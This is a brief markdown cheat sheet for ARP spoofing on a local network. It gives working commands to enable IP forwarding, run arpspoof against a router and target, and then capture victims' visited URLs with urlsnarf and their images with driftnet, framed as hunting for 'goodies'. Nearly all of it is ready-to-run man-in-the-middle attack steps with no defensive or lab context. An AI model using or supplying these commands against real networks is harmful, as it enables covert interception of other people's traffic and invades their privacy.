# ARP Spoofing

Identify a target by scanning the local network.

### Packet Forwarding

Configure packet forwarding before attempting to ARP spoof.

```bash
#check current status
cat /proc/sys/net/ipv4/ip_forward

#enable packet forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

#disable packet forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward
```

### arpspoof

```bash
#specify the interface, the router and the target 
arpspoof -i wlan0 -t $router $target
```

### Monitor Traffic

Use wireshark, tcpdump or other tools to watch network traffic for goodies.

```bash
#capture all URLS
urlsnarf -i wlan0

#monitor images :)
driftnet -i wlan0
```
